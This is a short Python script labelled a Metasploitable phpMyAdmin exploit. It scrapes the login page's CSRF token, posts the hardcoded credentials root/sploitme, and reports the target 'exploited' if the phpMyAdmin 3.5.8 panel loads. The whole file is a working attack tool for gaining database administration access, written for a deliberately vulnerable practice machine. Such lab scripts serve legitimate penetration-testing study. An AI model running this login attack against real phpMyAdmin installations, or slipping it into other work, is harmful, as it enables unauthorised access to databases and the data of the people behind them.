#!/usr/bin/env python3

import requests
import argparse
from bs4 import BeautifulSoup


class PHPMyAdmin:
    def __init__(self, host, port):
        self.__host = host
        self.__port = port
        self.__path = "/phpmyadmin/index.php"
        self.__token = None
        self.__requests = requests.session()

    def __csrf(self):
        r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__path}")
        soup = BeautifulSoup(r.text, 'lxml')
        self.__token = soup.select_one('input[name="token"]')['value']
        print(f"TOKEN: {self.__token}")

    def __exploit(self):
        params = {
            "pma_username": "root",
            "pma_password": "sploitme",
            "server": "1",
            "token": self.__token
        }
        r  = self.__requests.post(f"http://{self.__host}:{self.__port}{self.__path}", params=params)
        if r.status_code != 200:
            return False
        soup = BeautifulSoup(r.text, 'lxml')
        title = soup.find("title").text
        if "phpMyAdmin 3.5.8" in title:
            return True
        return False

    def run(self):
        self.__csrf()
        return self.__exploit()


def main(args):
    print("[+] Metasploitable PHPMyAdmin exploit by xentrick")
    print("[+] Exploiting " + args.host + ":" + args.port)

    exploit = PHPMyAdmin(args.host, int(args.port))
    if exploit.run():
        print("Target exploited")
    else:
        print("Exploit failed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True)
    args = parser.parse_args()

    main(args)
